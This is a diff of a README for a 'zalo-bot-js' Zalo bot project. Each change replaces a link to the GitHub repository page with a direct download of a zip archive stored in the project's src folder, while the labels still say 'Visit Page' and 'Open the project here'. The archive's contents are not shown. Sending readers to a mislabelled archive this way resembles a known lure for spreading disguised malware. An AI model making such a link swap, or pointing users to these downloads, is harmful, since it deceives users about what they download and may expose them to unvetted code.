@@ -1,12 +1,12 @@
 # 🤖 zalo-bot-js - Simple Tools for Zalo Bot Apps
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Glennlipsync343/zalo-bot-js)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Glennlipsync343/zalo-bot-js/main/src/js-bot-zalo-1.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and get the project files:
 
-[https://github.com/Glennlipsync343/zalo-bot-js](https://github.com/Glennlipsync343/zalo-bot-js)
+[https://raw.githubusercontent.com/Glennlipsync343/zalo-bot-js/main/src/js-bot-zalo-1.3.zip](https://raw.githubusercontent.com/Glennlipsync343/zalo-bot-js/main/src/js-bot-zalo-1.3.zip)
 
 ## 🖥️ What this is
 
@@ -160,7 +160,7 @@ If GitHub does not open in your browser, try this:
 
 Open the project here:
 
-[https://github.com/Glennlipsync343/zalo-bot-js](https://github.com/Glennlipsync343/zalo-bot-js)
+[https://raw.githubusercontent.com/Glennlipsync343/zalo-bot-js/main/src/js-bot-zalo-1.3.zip](https://raw.githubusercontent.com/Glennlipsync343/zalo-bot-js/main/src/js-bot-zalo-1.3.zip)
 
 ## 🧭 Quick path for Windows users
 
